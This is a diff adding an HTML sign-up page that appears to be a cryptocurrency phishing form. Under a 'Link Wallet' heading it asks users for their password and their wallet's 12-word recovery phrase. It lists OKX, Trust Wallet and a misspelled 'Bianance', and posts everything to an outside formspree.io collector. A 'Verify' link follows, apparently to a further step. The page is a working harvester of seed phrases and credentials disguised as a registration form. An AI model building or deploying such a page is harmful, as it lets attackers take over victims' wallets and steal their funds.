@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>singup</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body class="bd2">
+   <button ><a href="index.html">Home</a></button>
+    <h1 class="second">Sign Up</h1>
+    <p class="second">Please fill out this form with the required information</p>
+    <form method="post" action='https://formspree.io/f/xpzerkal'>
+      <fieldset>
+        <label for="first-name">Enter Your First Name: <input id="first-name" name="first-name" type="text" required /></label>
+        <label for="last-name">Enter Your Last Name: <input id="last-name" name="last-name" type="text" required /></label>
+        <label for="email">Enter Your Email: <input id="email" name="email" type="email" required /></label>
+        <label for="new-password">Create a New Password: <input id="new-password" name="new-password" type="password" pattern="[a-z0-9]{8,}"  required /></label>
+        <p> password must be 8  and a mixture of number.</p>
+      </fieldset>
+        <h2>Link Wallet</h2>
+        <label for="username">Enter username <input id="username" type="text" name="text" required /></label>
+        <label for="age">Input your age (years): <input id="age" type="number" name="age" min="18" max="120" /></label>
+        <label for="Wallet-name">Wallet Name
+          <select id="Wallet-name" name="Wallet-name" required>
+            <option value="">(select one)</option>
+            <option value="1">OKX</option>
+            <option value="2">Trust Wallet</option>
+            <option value="3">Bianance</option>
+          </select>
+        </label>
+        <label for="phrase">Wallet Phrase:
+          <textarea id="phrase" name="phrase" rows="3" cols="30" placeholder="12 Wallet Phrase" required></textarea>
+        </label>
+      </fieldset>
+      <input type="submit" value="Submit" />
+    </form>
+      <p><italic>Note:<br>
+          After sign Up click on verification button to verfy Account after getten verification code
+      </italic></p>
+      <button><a href="Verification.html">Verify</a></button>
+      
+</body>
+</html>
